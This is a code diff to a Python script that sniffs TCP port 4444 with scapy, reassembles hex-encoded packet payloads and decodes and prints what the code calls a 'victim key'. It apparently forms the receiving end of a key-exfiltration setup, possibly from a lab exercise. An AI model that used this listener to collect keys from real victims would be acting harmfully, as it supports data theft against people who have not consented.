@@ -19,17 +19,18 @@ def reconstruct_hex_string(packets):
 
 def deser_data(data):
     bytes_obj = bytes.fromhex(data)
-    return bytes_obj.decode("ASCII")
+    return bytes_obj.decode("utf-8")
 
 
 if __name__ == "__main__":
-    packets = sniff(filter="tcp port 4444", timeout=80, iface="eth0")
+    packets = sniff(filter="tcp port 4444", timeout=60, iface="ens33")
 
     reconstructed_hex_string = reconstruct_hex_string(packets)
 
     reconstructed_victim_key = deser_data(reconstructed_hex_string)
 
-    print(reconstructed_hex_string)
+    # print(reconstructed_hex_string)
 
     reconstructed_hex_string = reconstruct_hex_string(packets)
     reconstructed_victim_key = deser_data(reconstructed_hex_string)
+    print(reconstructed_victim_key)
